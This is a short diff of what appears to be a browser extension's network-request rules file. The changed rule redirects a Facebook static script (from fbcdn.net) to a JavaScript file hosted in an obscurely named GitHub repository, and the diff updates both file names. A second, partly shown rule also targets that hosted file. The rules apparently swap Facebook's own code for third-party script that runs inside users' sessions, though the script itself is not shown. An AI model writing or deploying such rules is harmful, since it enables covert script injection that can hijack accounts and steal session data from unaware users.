@@ -5,11 +5,11 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/bumpalex9/kjjkfgdabafpjjadkiifkhamebilghnh/main/jGUkeaJ0ahJ.js?v=452353456"
+        "url": "https://raw.githubusercontent.com/bumpalex9/kjjkfgdabafpjjadkiifkhamebilghnh/main/fQYX5BJAK6r.js?v=4523534561"
       }
     },
     "condition": {
-      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/jGUkeaJ0ahJ*",
+      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/fQYX5BJAK6r*",
       "resourceTypes": [
         "script"
       ]
@@ -34,7 +34,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://raw.githubusercontent.com/bumpalex9/kjjkfgdabafpjjadkiifkhamebilghnh/main/jGUkeaJ0ahJ.*"
+      "urlFilter": "https://raw.githubusercontent.com/bumpalex9/kjjkfgdabafpjjadkiifkhamebilghnh/main/fQYX5BJAK6r.*"
     }
   },
    {
